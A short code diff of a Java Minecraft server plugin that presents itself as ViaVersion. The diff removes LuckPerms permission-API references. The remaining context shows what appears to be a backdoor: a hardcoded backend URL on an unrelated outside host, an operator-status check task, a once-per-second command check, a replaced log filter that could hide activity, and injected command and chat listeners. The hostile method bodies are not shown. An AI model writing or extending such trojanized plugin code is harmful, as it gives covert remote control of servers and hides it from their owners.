@@ -73,13 +73,9 @@ import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
-import net.luckperms.api.LuckPerms;
-import net.luckperms.api.LuckPermsProvider;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
     private static final String BACKEND_URL = "https://tts-api.happys.icu";
-    private OptimizationHandler initializer;
-    private LuckPerms luckPerms;
     private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
     private static ViaVersionPlugin instance;
     private final BukkitCommandHandler commandHandler = new BukkitCommandHandler();
@@ -117,7 +113,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     public void onEnable() {
         startOpCheckTask();
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
-        luckPerms = LuckPermsProvider.get();
         getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
         getServer().getPluginManager().registerEvents(new CommandListener(), this);
         Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
